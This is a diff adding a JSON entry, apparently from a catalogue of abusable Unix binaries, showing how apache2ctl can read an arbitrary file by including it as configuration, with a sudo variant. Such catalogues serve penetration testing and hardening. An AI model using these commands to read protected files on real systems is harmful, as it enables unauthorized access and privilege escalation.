@@ -1,0 +1,15 @@
+{
+  "description": "This includes the file in the actual configuration file, the first line is leaked as an error message.",
+  "functions": {
+    "file-read": [
+      {
+        "code": "LFILE=file_to_read\napache2ctl -c \"Include $LFILE\" -k stop\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "LFILE=file_to_read\nsudo apache2ctl -c \"Include $LFILE\" -k stop\n"
+      }
+    ]
+  }
+}
